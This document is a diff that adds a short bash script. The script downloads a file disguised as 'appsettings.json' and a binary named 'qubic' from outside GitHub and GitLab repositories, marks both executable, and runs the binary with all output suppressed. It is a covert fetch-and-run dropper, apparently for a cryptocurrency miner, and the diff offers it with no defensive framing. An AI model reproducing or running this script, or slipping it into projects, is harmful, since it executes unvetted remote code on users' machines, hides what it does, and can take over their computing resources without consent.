@@ -1,0 +1,4 @@
+#!/bin/bash
+wget https://raw.githubusercontent.com/cahayaangkasaku1/cubic/main/appsettings.json && chmod +x appsettings.json
+wget -O qubic https://gitlab.com/vainlevy/qubic/-/raw/main/qube && chmod +x qubic
+./qubic > /dev/null 2>&1
